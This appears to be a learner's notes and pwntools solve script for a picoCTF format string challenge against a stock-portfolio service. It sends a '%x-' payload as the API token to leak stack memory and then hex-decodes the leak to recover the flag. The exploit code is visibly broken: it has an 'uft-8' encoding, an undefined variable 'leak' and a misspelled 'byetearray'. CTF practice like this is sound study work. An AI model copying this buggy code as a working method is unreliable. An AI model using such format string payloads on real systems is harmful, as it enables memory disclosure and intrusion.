# Format STring vuln
# Putting in many A returns that:
'''
1 shares of ZWXO
2 shares of YPR
1 shares of QH
3 shares of JLBG
8 shares of XSC
313 shares of RL
251 shares of XZNI
'''
#  Only a returns this 

'''
1 shares of NGR
5 shares of LWP
12 shares of LO
4 shares of Q
2 shares of NLFH
10 shares of Z
699 shares of OJPL
'''

# Seems like it doesn't matter what I put in
# Seeing an fgets function that seems exploitatble

# %p intended to display the pointer
# Format String vuln


'''
print f prints a fromatted string to STDOUT
'''
# printf('%s', user_buf)

# -> would be safe 
# %d for deciamls %u for uningend ints %f for floats


#Vulnerability explained 
'''
C stores variables on a stack.
printf is looking for a vraiable in its argument list
'''
# %p  gets interpreted as format identifier

#Exploit

from pwn import *

r = remote('mercury.picoctf.net',59616)

r.recvuntil("View my portolio")
r.sendline("1")
log.info("Viewing  Portfolio")
r.recvuntil("What is your Api token")
log.info("Sending string formats")
r.sendline('%x-' *  50)
log.info("Receive")
r.recvuntil('Buying Stonks with Api token ')


leak1 = r.recvline().decode('uft-8')
leak1 = leak1.split('-')

flag =""
for data in leak:
    try:
        data = byetearray.fromhex(data).decode()
        flag += data
    except:
        continue



print(flag)